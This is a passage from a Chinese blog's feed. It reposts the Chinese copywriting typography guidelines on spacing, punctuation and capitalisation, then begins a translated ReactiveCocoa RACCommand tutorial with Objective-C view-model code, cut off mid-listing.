    <content type="html"><![CDATA[<p>本文来自 <a href="https://github.com/sparanoid/chinese-copywriting-guidelines" target="_blank" rel="external">chinese-copywriting-guidelines</a><br>作者：<a href="https://github.com/sparanoid" target="_blank" rel="external">sparanoid</a><br>中文版作者：<a href="https://github.com/mzlogin" target="_blank" rel="external">mzlogin</a></p>
<h1 id="中文文案排版指北"><a href="#中文文案排版指北" class="headerlink" title="中文文案排版指北"></a>中文文案排版指北</h1><p><img src="https://david-dm.org/mzlogin/chinese-copywriting-guidelines/dev-status.svg" alt="devDependency Status"></p>
<p>统一中文文案、排版的相关用法，降低团队成员之间的沟通成本，增强网站气质。</p>
<a id="more"></a>
<p>Other languages:</p>
<ul>
<li><a href="https://github.com/mzlogin/chinese-copywriting-guidelines/blob/Simplified/README.en.md" target="_blank" rel="external">English</a></li>
<li><a href="https://github.com/sparanoid/chinese-copywriting-guidelines" target="_blank" rel="external">Chinese Traditional</a></li>
<li><a href="https://github.com/mzlogin/chinese-copywriting-guidelines" target="_blank" rel="external">Chinese Simplified</a></li>
</ul>
<hr>
<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
<li><a href="#空格">空格</a><ul>
<li><a href="#中英文之间需要增加空格">中英文之间需要增加空格</a></li>
<li><a href="#中文与数字之间需要增加空格">中文与数字之间需要增加空格</a></li>
<li><a href="#数字与单位之间需要增加空格">数字与单位之间需要增加空格</a></li>
<li><a href="#全角标点与其他字符之间不加空格">全角标点与其他字符之间不加空格</a></li>
<li><a href="#-ms-text-autospace-to-the-rescue"><code>-ms-text-autospace</code> to the rescue?</a></li>
</ul>
</li>
<li><a href="#标点符号">标点符号</a><ul>
<li><a href="#不重复使用标点符号">不重复使用标点符号</a></li>
</ul>
</li>
<li><a href="#全角和半角">全角和半角</a><ul>
<li><a href="#使用全角中文标点">使用全角中文标点</a></li>
<li><a href="#数字使用半角字符">数字使用半角字符</a></li>
<li><a href="#遇到完整的英文整句特殊名词其內容使用半角标点">遇到完整的英文整句、特殊名词，其內容使用半角标点</a></li>
</ul>
</li>
<li><a href="#名词">名词</a><ul>
<li><a href="#专有名词使用正确的大小写">专有名词使用正确的大小写</a></li>
<li><a href="#不要使用不地道的缩写">不要使用不地道的缩写</a></li>
</ul>
</li>
<li><a href="#争议">争议</a><ul>
<li><a href="#链接之间增加空格">链接之间增加空格</a></li>
<li><a href="#简体中文使用直角引号">简体中文使用直角引号</a></li>
</ul>
</li>
<li><a href="#工具">工具</a></li>
<li><a href="#谁在这样做">谁在这样做？</a></li>
<li><a href="#参考文献">参考文献</a></li>
</ul>
<!--more-->
<h2 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h2><p>「有研究显示，打字的时候不喜欢在中文和英文之间加空格的人，感情路都走得很辛苦，有七成的比例会在 34 岁的时候跟自己不爱的人结婚，而其余三成的人最后只能把遗产留给自己的猫。毕竟爱情跟书写都需要适时地留白。</p>
<p>与大家共勉之。」——<a href="https://github.com/vinta/pangu.js" target="_blank" rel="external">vinta/paranoid-auto-spacing</a></p>
<h3 id="中英文之间需要增加空格"><a href="#中英文之间需要增加空格" class="headerlink" title="中英文之间需要增加空格"></a>中英文之间需要增加空格</h3><p>正确：</p>
<blockquote>
<p>在 LeanCloud 上，数据存储是围绕 <code>AVObject</code> 进行的。</p>
</blockquote>
<p>错误：</p>
<blockquote>
<p>在LeanCloud上，数据存储是围绕<code>AVObject</code>进行的。</p>
<p>在 LeanCloud上，数据存储是围绕<code>AVObject</code> 进行的。</p>
</blockquote>
<p>完整的正确用法：</p>
<blockquote>
<p>在 LeanCloud 上，数据存储是围绕 <code>AVObject</code> 进行的。每个 <code>AVObject</code> 都包含了与 JSON 兼容的 key-value 对应的数据。数据是 schema-free 的，你不需要在每个 <code>AVObject</code> 上提前指定存在哪些键，只要直接设定对应的 key-value 即可。</p>
</blockquote>
<p>例外：「豆瓣FM」等产品名词，按照官方所定义的格式书写。</p>
<h3 id="中文与数字之间需要增加空格"><a href="#中文与数字之间需要增加空格" class="headerlink" title="中文与数字之间需要增加空格"></a>中文与数字之间需要增加空格</h3><p>正确：</p>
<blockquote>
<p>今天出去买菜花了 5000 元。</p>
</blockquote>
<p>错误：</p>
<blockquote>
<p>今天出去买菜花了 5000元。</p>
<p>今天出去买菜花了5000元。</p>
</blockquote>
<h3 id="数字与单位之间需要增加空格"><a href="#数字与单位之间需要增加空格" class="headerlink" title="数字与单位之间需要增加空格"></a>数字与单位之间需要增加空格</h3><p>正确：</p>
<blockquote>
<p>我家的光纤入户宽带有 10 Gbps，SSD 一共有 20 TB。</p>
</blockquote>
<p>错误：</p>
<blockquote>
<p>我家的光纤入户宽带有 10Gbps，SSD 一共有 10TB。</p>
</blockquote>
<p>例外：度／百分比与数字之间不需要增加空格：</p>
<p>正确：</p>
<blockquote>
<p>今天是 233° 的高温。</p>
<p>新 MacBook Pro 有 15% 的 CPU 性能提升。</p>
</blockquote>
<p>错误：</p>
<blockquote>
<p>今天是 233 ° 的高温。</p>
<p>新 MacBook Pro 有 15 % 的 CPU 性能提升。</p>
</blockquote>
<h3 id="全角标点与其他字符之间不加空格"><a href="#全角标点与其他字符之间不加空格" class="headerlink" title="全角标点与其他字符之间不加空格"></a>全角标点与其他字符之间不加空格</h3><p>正确：</p>
<blockquote>
<p>刚刚买了一部 iPhone，好开心！</p>
</blockquote>
<p>错误：</p>
<blockquote>
<p>刚刚买了一部 iPhone ，好开心！</p>
</blockquote>
<h3 id="ms-text-autospace-to-the-rescue"><a href="#ms-text-autospace-to-the-rescue" class="headerlink" title="-ms-text-autospace to the rescue?"></a><code>-ms-text-autospace</code> to the rescue?</h3><p>Microsoft 有个 <a href="http://msdn.microsoft.com/en-us/library/ie/ms531164(v=vs.85" target="_blank" rel="external"><code>-ms-text-autospace</code></a>.aspx) 的 CSS 属性可以实现自动为中英文之间增加空白。不过目前并未普及，另外在其他应用场景，例如 OS X、iOS 的用户界面目前并不存在这个特性，所以请继续保持随手加空格的习惯。</p>
<h2 id="标点符号"><a href="#标点符号" class="headerlink" title="标点符号"></a>标点符号</h2><h3 id="不重复使用标点符号"><a href="#不重复使用标点符号" class="headerlink" title="不重复使用标点符号"></a>不重复使用标点符号</h3><p>正确：</p>
<blockquote>
<p>德国队竟然战胜了巴西队！</p>
<p>她竟然对你说「喵」？！</p>
</blockquote>
<p>错误：</p>
<blockquote>
<p>德国队竟然战胜了巴西队！！</p>
<p>德国队竟然战胜了巴西队！！！！！！！！</p>
<p>她竟然对你说「喵」？？！！</p>
<p>她竟然对你说「喵」？！？！？？！！</p>
</blockquote>
<h2 id="全角和半角"><a href="#全角和半角" class="headerlink" title="全角和半角"></a>全角和半角</h2><p>不明白什么是全角（全形）与半角（半形）符号？请查看维基百科词条『<a href="http://zh.wikipedia.org/wiki/%E5%85%A8%E5%BD%A2%E5%92%8C%E5%8D%8A%E5%BD%A2" target="_blank" rel="external">全角和半角</a>』。</p>
<h3 id="使用全角中文标点"><a href="#使用全角中文标点" class="headerlink" title="使用全角中文标点"></a>使用全角中文标点</h3><p>正确：</p>
<blockquote>
<p>嗨！你知道嘛？今天前台的小妹跟我说「喵」了哎！</p>
<p>核磁共振成像（NMRI）是什么原理都不知道？JFGI！</p>
</blockquote>
<p>错误：</p>
<blockquote>
<p>嗨! 你知道嘛? 今天前台的小妹跟我说 “喵” 了哎!</p>
<p>嗨!你知道嘛?今天前台的小妹跟我说”喵”了哎!</p>
<p>核磁共振成像 (NMRI) 是什么原理都不知道? JFGI!</p>
<p>核磁共振成像(NMRI)是什么原理都不知道?JFGI!</p>
</blockquote>
<h3 id="数字使用半角字符"><a href="#数字使用半角字符" class="headerlink" title="数字使用半角字符"></a>数字使用半角字符</h3><p>正确：</p>
<blockquote>
<p>这件蛋糕只卖 1000 元。</p>
</blockquote>
<p>错误：</p>
<blockquote>
<p>这件蛋糕只卖 １０００ 元。</p>
</blockquote>
<p>例外：在设计稿、宣传海报中如出现极少量数字的情形时，为方便文字对齐，是可以使用全角数字的。</p>
<h3 id="遇到完整的英文整句、特殊名词，其內容使用半角标点"><a href="#遇到完整的英文整句、特殊名词，其內容使用半角标点" class="headerlink" title="遇到完整的英文整句、特殊名词，其內容使用半角标点"></a>遇到完整的英文整句、特殊名词，其內容使用半角标点</h3><p>正确：</p>
<blockquote>
<p>乔布斯那句话是怎么说的？「Stay hungry, stay foolish.」</p>
<p>推荐你阅读《Hackers &amp; Painters: Big Ideas from the Computer Age》，非常的有趣。</p>
</blockquote>
<p>错误：</p>
<blockquote>
<p>乔布斯那句话是怎么说的？「Stay hungry，stay foolish。」</p>
<p>推荐你阅读《Hackers＆Painters：Big Ideas from the Computer Age》，非常的有趣。</p>
</blockquote>
<h2 id="名词"><a href="#名词" class="headerlink" title="名词"></a>名词</h2><h3 id="专有名词使用正确的大小写"><a href="#专有名词使用正确的大小写" class="headerlink" title="专有名词使用正确的大小写"></a>专有名词使用正确的大小写</h3><p>大小写相关用法原属于英文书写范畴，不属于本 wiki 讨论內容，在这里只对部分易错用法进行简述。</p>
<p>正确：</p>
<blockquote>
<p>使用 GitHub 登录</p>
<p>我们的客户有 GitHub、Foursquare、Microsoft Corporation、Google、Facebook, Inc.。</p>
</blockquote>
<p>错误：</p>
<blockquote>
<p>使用 github 登录</p>
<p>使用 GITHUB 登录</p>
<p>使用 Github 登录</p>
<p>使用 gitHub 登录</p>
<p>使用 gｲんĤЦ8 登录</p>
<p>我们的客户有 github、foursquare、microsoft corporation、google、facebook, inc.。</p>
<p>我们的客户有 GITHUB、FOURSQUARE、MICROSOFT CORPORATION、GOOGLE、FACEBOOK, INC.。</p>
<p>我们的客户有 Github、FourSquare、MicroSoft Corporation、Google、FaceBook, Inc.。</p>
<p>我们的客户有 gitHub、fourSquare、microSoft Corporation、google、faceBook, Inc.。</p>
<p>我们的客户有 gｲんĤЦ8、ｷouЯƧquﾑгє、๓เςг๏ร๏Ŧt ς๏гק๏гคtเ๏ภn、900913、ƒ4ᄃëв๏๏к, IПᄃ.。</p>
</blockquote>
<p>注意：当网页中需要配合整体视觉风格而出现全部大写／小写的情形，HTML 中请使用标准的大小写规范进行书写；并通过 <code>text-transform: uppercase;</code>／<code>text-transform: lowercase;</code> 对表现形式进行定义。</p>
<h3 id="不要使用不地道的缩写"><a href="#不要使用不地道的缩写" class="headerlink" title="不要使用不地道的缩写"></a>不要使用不地道的缩写</h3><p>正确：</p>
<blockquote>
<p>我们需要一位熟悉 JavaScript、HTML5，至少理解一种框架（如 Backbone.js、AngularJS、React 等）的前端开发者。</p>
</blockquote>
<p>错误：</p>
<blockquote>
<p>我们需要一位熟悉 Js、h5，至少理解一种框架（如 backbone、angular、RJS 等）的 FED。</p>
</blockquote>
<h2 id="争议"><a href="#争议" class="headerlink" title="争议"></a>争议</h2><p>以下用法略带有个人色彩，既：无论是否遵循下述规则，从语法的角度来讲都是<strong>正确</strong>的。</p>
<h3 id="链接之间增加空格"><a href="#链接之间增加空格" class="headerlink" title="链接之间增加空格"></a>链接之间增加空格</h3><p>用法：</p>
<blockquote>
<p>请 <a href="#">提交一个 issue</a> 并分配给相关同事。</p>
<p>访问我们网站的最新动态，请 <a href="#">点击这里</a> 进行订阅！</p>
</blockquote>
<p>对比用法：</p>
<blockquote>
<p>请<a href="#">提交一个 issue</a> 并分配给相关同事。</p>
<p>访问我们网站的最新动态，请<a href="#">点击这里</a>进行订阅！</p>
</blockquote>
<h3 id="简体中文使用直角引号"><a href="#简体中文使用直角引号" class="headerlink" title="简体中文使用直角引号"></a>简体中文使用直角引号</h3><p>用法：</p>
<blockquote>
<p>「老师，『有条不紊』的『紊』是什么意思？」</p>
</blockquote>
<p>对比用法：</p>
<blockquote>
<p>“老师，‘有条不紊’的‘紊’是什么意思？”</p>
</blockquote>
<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><table>
<thead>
<tr>
<th>仓库</th>
<th>语言</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://github.com/vinta/paranoid-auto-spacing" target="_blank" rel="external">vinta/paranoid-auto-spacing</a></td>
<td>JavaScript</td>
</tr>
<tr>
<td><a href="https://github.com/huei90/pangu.node" target="_blank" rel="external">huei90/pangu.node</a></td>
<td>Node.js</td>
</tr>
<tr>
<td><a href="https://github.com/huacnlee/auto-correct" target="_blank" rel="external">huacnlee/auto-correct</a></td>
<td>Ruby</td>
</tr>
<tr>
<td><a href="https://github.com/sparanoid/space-lover" target="_blank" rel="external">sparanoid/space-lover</a></td>
<td>PHP (WordPress)</td>
</tr>
<tr>
<td><a href="https://github.com/NauxLiu/auto-correct" target="_blank" rel="external">nauxliu/auto-correct</a></td>
<td>PHP</td>
</tr>
<tr>
<td><a href="https://github.com/hotoo/pangu.vim" target="_blank" rel="external">hotoo/pangu.vim</a></td>
<td>Vim</td>
</tr>
<tr>
<td><a href="https://github.com/sparanoid/grunt-auto-spacing" target="_blank" rel="external">sparanoid/grunt-auto-spacing</a></td>
<td>Node.js (Grunt)</td>
</tr>
<tr>
<td><a href="https://github.com/hjiang/scripts/blob/master/add-space-between-latin-and-cjk" target="_blank" rel="external">hjiang/scripts/add-space-between-latin-and-cjk</a></td>
<td>Python</td>
</tr>
</tbody>
</table>
<h2 id="谁在这样做？"><a href="#谁在这样做？" class="headerlink" title="谁在这样做？"></a>谁在这样做？</h2><table>
<thead>
<tr>
<th>网站</th>
<th>文案</th>
<th>UGC</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="http://www.apple.com/cn/" target="_blank" rel="external">Apple 中国</a></td>
<td>Yes</td>
<td>N/A</td>
</tr>
<tr>
<td><a href="http://www.apple.com/hk/" target="_blank" rel="external">Apple 香港</a></td>
<td>Yes</td>
<td>N/A</td>
</tr>
<tr>
<td><a href="http://www.apple.com/tw/" target="_blank" rel="external">Apple 台湾</a></td>
<td>Yes</td>
<td>N/A</td>
</tr>
<tr>
<td><a href="http://www.microsoft.com/zh-cn/" target="_blank" rel="external">Microsoft 中国</a></td>
<td>Yes</td>
<td>N/A</td>
</tr>
<tr>
<td><a href="http://www.microsoft.com/zh-hk/" target="_blank" rel="external">Microsoft 香港</a></td>
<td>Yes</td>
<td>N/A</td>
</tr>
<tr>
<td><a href="http://www.microsoft.com/zh-tw/" target="_blank" rel="external">Microsoft 台湾</a></td>
<td>Yes</td>
<td>N/A</td>
</tr>
<tr>
<td><a href="https://leancloud.cn/" target="_blank" rel="external">LeanCloud</a></td>
<td>Yes</td>
<td>N/A</td>
</tr>
<tr>
<td><a href="https://www.zhihu.com/" target="_blank" rel="external">知乎</a></td>
<td>Yes</td>
<td>部分用户达成</td>
</tr>
<tr>
<td><a href="https://www.v2ex.com/" target="_blank" rel="external">V2EX</a></td>
<td>Yes</td>
<td>Yes</td>
</tr>
<tr>
<td><a href="https://segmentfault.com/" target="_blank" rel="external">SegmentFault</a></td>
<td>Yes</td>
<td>部分用户达成</td>
</tr>
<tr>
<td><a href="http://apple4us.com/" target="_blank" rel="external">Apple4us</a></td>
<td>Yes</td>
<td>N/A</td>
</tr>
<tr>
<td><a href="https://www.wandoujia.com/" target="_blank" rel="external">豌豆荚</a></td>
<td>Yes</td>
<td>N/A</td>
</tr>
<tr>
<td><a href="https://ruby-china.org/" target="_blank" rel="external">Ruby China</a></td>
<td>Yes</td>
<td>标题达成</td>
</tr>
<tr>
<td><a href="https://phphub.org/" target="_blank" rel="external">PHPHub</a></td>
<td>Yes</td>
<td>标题达成</td>
</tr>
</tbody>
</table>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://grammar.about.com/od/punctuationandmechanics/a/Guidelines-For-Using-Capital-Letters.htm" target="_blank" rel="external">Guidelines for Using Capital Letters</a></li>
<li><a href="http://en.wikipedia.org/wiki/Letter_case" target="_blank" rel="external">Letter case - Wikipedia</a></li>
<li><a href="http://www.oxforddictionaries.com/words/punctuation" target="_blank" rel="external">Punctuation - Oxford Dictionaries</a></li>
<li><a href="https://owl.english.purdue.edu/owl/section/1/6/" target="_blank" rel="external">Punctuation - The Purdue OWL</a></li>
<li><a href="http://www.wikihow.com/Use-English-Punctuation-Correctly" target="_blank" rel="external">How to Use English Punctuation Corrently - wikiHow</a></li>
<li><a href="https://zh.opensuse.org/index.php?title=Help:%E6%A0%BC%E5%BC%8F" target="_blank" rel="external">格式 - openSUSE</a></li>
<li><a href="http://zh.wikipedia.org/wiki/%E5%85%A8%E5%BD%A2%E5%92%8C%E5%8D%8A%E5%BD%A2" target="_blank" rel="external">全角和半角 - 维基百科</a></li>
<li><a href="http://zh.wikipedia.org/wiki/%E5%BC%95%E8%99%9F" target="_blank" rel="external">引号 - 维基百科</a></li>
<li><a href="http://zh.wikipedia.org/wiki/%E7%96%91%E5%95%8F%E9%A9%9A%E5%98%86%E8%99%9F" target="_blank" rel="external">疑问惊叹号 - 维基百科</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文来自 &lt;a href=&quot;https://github.com/sparanoid/chinese-copywriting-guidelines&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;chinese-copywriting-guidelines&lt;/a&gt;&lt;br&gt;作者：&lt;a href=&quot;https://github.com/sparanoid&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;sparanoid&lt;/a&gt;&lt;br&gt;中文版作者：&lt;a href=&quot;https://github.com/mzlogin&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;mzlogin&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;中文文案排版指北&quot;&gt;&lt;a href=&quot;#中文文案排版指北&quot; class=&quot;headerlink&quot; title=&quot;中文文案排版指北&quot;&gt;&lt;/a&gt;中文文案排版指北&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://david-dm.org/mzlogin/chinese-copywriting-guidelines/dev-status.svg&quot; alt=&quot;devDependency Status&quot;&gt;&lt;/p&gt;
&lt;p&gt;统一中文文案、排版的相关用法，降低团队成员之间的沟通成本，增强网站气质。&lt;/p&gt;
    
    </summary>
    
      <category term="转载" scheme="http://zhoulingyu.com/categories/%E8%BD%AC%E8%BD%BD/"/>
    
    
      <category term="reproduction" scheme="http://zhoulingyu.com/tags/reproduction/"/>
    
  </entry>
  
  <entry>
    <title>ReactiveCocoa概要：了解和使用RACCommand</title>
    <link href="http://zhoulingyu.com/2016/08/05/ReactiveCocoa%E6%A6%82%E8%A6%81%EF%BC%9A%E4%BA%86%E8%A7%A3%E5%92%8C%E4%BD%BF%E7%94%A8RACCommand/"/>
    <id>http://zhoulingyu.com/2016/08/05/ReactiveCocoa概要：了解和使用RACCommand/</id>
    <published>2016-08-05T10:33:00.000Z</published>
    <updated>2017-05-15T02:48:26.475Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原文地址"><a href="#原文地址" class="headerlink" title="原文地址"></a>原文地址</h1><p><a href="http://codeblog.shape.dk/blog/2013/12/05/reactivecocoa-essentials-understanding-and-using-raccommand/" target="_blank" rel="external">点击这里</a></p>
<p>这几天部门的前辈再用RAC的时候问到一个问题，RACCommand在RAC中具体的作用和起到的功能，到底应该如何应用它。</p>
<p>关于RAC的使用文章非常多，但是大多仅限于介绍和基本的使用方法，很少介绍RAC究竟应该如何优雅的嵌入到项目中。</p>
<p>在查阅资料的时候发现了此篇博文，写的非常细致，所以做了一次搬运工。</p>
<p>另，妹子我的英文属于渣渣系列，所以有什么翻译不当，请一定要指教。</p>
<a id="more"></a>
<h1 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h1><p>文章中所有代码在<a href="https://github.com/olegam/RACCommandExample" target="_blank" rel="external">这里</a></p>
<h1 id="RACCommand是你的新伙伴吗？"><a href="#RACCommand是你的新伙伴吗？" class="headerlink" title="RACCommand是你的新伙伴吗？"></a>RACCommand是你的新伙伴吗？</h1><p><code>RACCommand</code>是ReactiveCocoa最精华的部分之一，它可以让你在开发中节约大量的时间并让你的iOS或者OS X app有更强的鲁棒性。</p>
<p>我见过不少刚接触ReactiveCocoa（后文将简写为RAC），还不能完全理解<code>RACCommand</code>是如何工作又不知何时应该使用<code>RACCommand</code>的同学。所以我认为这个小介绍将会市场实用，可以给他们带来一些启发。官方文档并没有给出多少如何使用RACCommand的Examples，但是<a href="https://github.com/ReactiveCocoa/ReactiveCocoa/blob/master/ReactiveCocoa/Objective-C/RACCommand.h" target="_blank" rel="external">RACCommand头文件的介绍还是很不错的</a>，不过这对刚开始用RAC的同学来说还是太难理解了。</p>
<p><code>RACCommand</code>类是用于表示一些操作的执行。通常，是由于UI上的一些事件触发了<code>RACCommand</code>的执行。比如当用户按了一个按钮，如果对应<code>RACCommand</code>实例可以被执行，就会执行相应的操作。这使得它很容易和UI进行绑定，同时可以保证当<code>RACCommand</code>处于<code>not enabled</code>时<code>RACCommand</code>实例的操作不会被执行。当Command可以执行时，常做的方式是把allowsconcuuent的属性设置为NO，这可以保证Command已经执行完成后不会被重复执行。Command执行的结果是一个RACSignal，因此你可以调用<code>next:</code>、<code>completed:</code>、或者<code>error:</code>。后面将会展示具体使用方式。</p>
<h1 id="Example-App"><a href="#Example-App" class="headerlink" title="Example App"></a>Example App</h1><p>我们假设我们正在设计一个简单的app，其功能是让用户订阅一个邮件。最简单的方式是，用一个UITextField和一个UIButton。当用户输入email并且点击按钮的时候，email地址将会传给某个web服务。看起来很简单，但是我们应该确保用户有最好的体验。<code>如果用户按了两次按钮？``如何处理请求出错？``如果email不合法？``RACCommand</code>可以帮助我们处理这些情况。在这篇文章中将一步步完善这个小app以此来讨论一些概念和工作原理。</p>
<p><img src="http://codeblog.shape.dk/images/raccommand_example_app_screenshot.png" alt=""></p>
<p>可以从<a href="https://github.com/olegam/RACCommandExample" target="_blank" rel="external">这里</a>获得源码。</p>
<p>从一个非常简单的ViewController可以很好的实践MVVM模式。</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">- (<span class="keyword">void</span>)bindWithViewModel &#123;</div><div class="line">  RAC(<span class="keyword">self</span>.viewModel, email) = <span class="keyword">self</span>.emailTextField.rac_textSignal;</div><div class="line">  <span class="keyword">self</span>.subscribeButton.rac_command = <span class="keyword">self</span>.viewModel.subscribeCommand;</div><div class="line">  RAC(<span class="keyword">self</span>.statusLabel, text) = RACObserve(<span class="keyword">self</span>.viewModel, statusMessage);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在上面的方法（在<code>viewDidLoad</code>中调用），在View和ViewModel中建立了绑定关系。下面是ViewModel的定义：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">SubscribeViewModel</span> : <span class="title">NSObject</span></span></div><div class="line"></div><div class="line"><span class="keyword">@property</span>(<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) RACCommand *subscribeCommand;</div><div class="line"></div><div class="line"><span class="comment">// write to this property</span></div><div class="line"><span class="keyword">@property</span>(<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) <span class="built_in">NSString</span> *email;</div><div class="line"></div><div class="line"><span class="comment">// read from this property</span></div><div class="line"><span class="keyword">@property</span>(<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) <span class="built_in">NSString</span> *statusMessage;</div><div class="line"></div><div class="line"><span class="keyword">@end</span></div></pre></td></tr></table></figure>
<p>如上所示，一个暴露出的RACCommand属性。另外两个是字符串属性，它们和View的两个属性绑定在一起。ViewModel的完整实现如下:</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#import <span class="meta-string">"SubscribeViewModel.h"</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">"AFHTTPRequestOperationManager+RACSupport.h"</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">"NSString+EmailAdditions.h"</span></span></div><div class="line"></div><div class="line"><span class="keyword">static</span> <span class="built_in">NSString</span> *<span class="keyword">const</span> kSubscribeURL = <span class="string">@"http://reactivetest.apiary.io/subscribers"</span>;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">SubscribeViewModel</span> ()</span></div><div class="line"><span class="keyword">@property</span>(<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) RACSignal *emailValidSignal;</div><div class="line"><span class="keyword">@end</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">@implementation</span> <span class="title">SubscribeViewModel</span></span></div><div class="line"></div><div class="line">- (<span class="keyword">id</span>)init &#123;</div><div class="line">  <span class="keyword">self</span> = [<span class="keyword">super</span> init];</div><div class="line">  <span class="keyword">if</span> (<span class="keyword">self</span>) &#123;</div><div class="line">      [<span class="keyword">self</span> mapSubscribeCommandStateToStatusMessage];</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="keyword">self</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">- (<span class="keyword">void</span>)mapSubscribeCommandStateToStatusMessage &#123;</div><div class="line">  RACSignal *startedMessageSource = [<span class="keyword">self</span>.subscribeCommand.executionSignals map:^<span class="keyword">id</span>(RACSignal *subscribeSignal) &#123;</div><div class="line">      <span class="keyword">return</span> <span class="built_in">NSLocalizedString</span>(<span class="string">@"Sending request..."</span>, <span class="literal">nil</span>);</div><div class="line">  &#125;];</div><div class="line"></div><div class="line">  RACSignal *completedMessageSource = [<span class="keyword">self</span>.subscribeCommand.executionSignals flattenMap:^RACStream *(RACSignal *subscribeSignal) &#123;</div><div class="line">      <span class="keyword">return</span> [[[subscribeSignal materialize] filter:^<span class="built_in">BOOL</span>(RACEvent *event) &#123;</div><div class="line">          <span class="keyword">return</span> event.eventType == RACEventTypeCompleted;</div><div class="line">      &#125;] map:^<span class="keyword">id</span>(<span class="keyword">id</span> value) &#123;</div><div class="line">          <span class="keyword">return</span> <span class="built_in">NSLocalizedString</span>(<span class="string">@"Thanks"</span>, <span class="literal">nil</span>);</div><div class="line">      &#125;];</div><div class="line">  &#125;];</div><div class="line"></div><div class="line">  RACSignal *failedMessageSource = [[<span class="keyword">self</span>.subscribeCommand.errors subscribeOn:[RACScheduler mainThreadScheduler]] map:^<span class="keyword">id</span>(<span class="built_in">NSError</span> *error) &#123;</div><div class="line">      <span class="keyword">return</span> <span class="built_in">NSLocalizedString</span>(<span class="string">@"Error :("</span>, <span class="literal">nil</span>);</div><div class="line">  &#125;];</div><div class="line"></div><div class="line">  RAC(<span class="keyword">self</span>, statusMessage) = [RACSignal merge:@[startedMessageSource, completedMessageSource, failedMessageSource]];</div><div class="line">&#125;</div><div class="line"></div><div class="line">- (RACCommand *)subscribeCommand &#123;</div><div class="line">  <span class="keyword">if</span> (!_subscribeCommand) &#123;</div><div class="line">      <span class="built_in">NSString</span> *email = <span class="keyword">self</span>.email;</div><div class="line">      _subscribeCommand = [[RACCommand alloc] initWithEnabled:<span class="keyword">self</span>.emailValidSignal signalBlock:^RACSignal *(<span class="keyword">id</span> input) &#123;</div><div class="line">          <span class="keyword">return</span> [SubscribeViewModel postEmail:email];</div><div class="line">      &#125;];</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> _subscribeCommand;</div><div class="line">&#125;</div><div class="line"></div><div class="line">+ (RACSignal *)postEmail:(<span class="built_in">NSString</span> *)email &#123;</div><div class="line">  AFHTTPRequestOperationManager *manager = [AFHTTPRequestOperationManager manager];</div><div class="line">  manager.requestSerializer = [AFJSONRequestSerializer new];</div><div class="line">  <span class="built_in">NSDictionary</span> *body = @&#123;<span class="string">@"email"</span>: email ?: <span class="string">@""</span>&#125;;</div><div class="line">  <span class="keyword">return</span> [[[manager rac_POST:kSubscribeURL parameters:body] logError] replayLazily];</div><div class="line">&#125;</div><div class="line"></div><div class="line">- (RACSignal *)emailValidSignal &#123;</div><div class="line">  <span class="keyword">if</span> (!_emailValidSignal) &#123;</div><div class="line">      _emailValidSignal = [RACObserve(<span class="keyword">self</span>, email) map:^<span class="keyword">id</span>(<span class="built_in">NSString</span> *email) &#123;</div><div class="line">          <span class="keyword">return</span> @([email isValidEmail]);</div><div class="line">      &#125;];</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> _emailValidSignal;</div><div 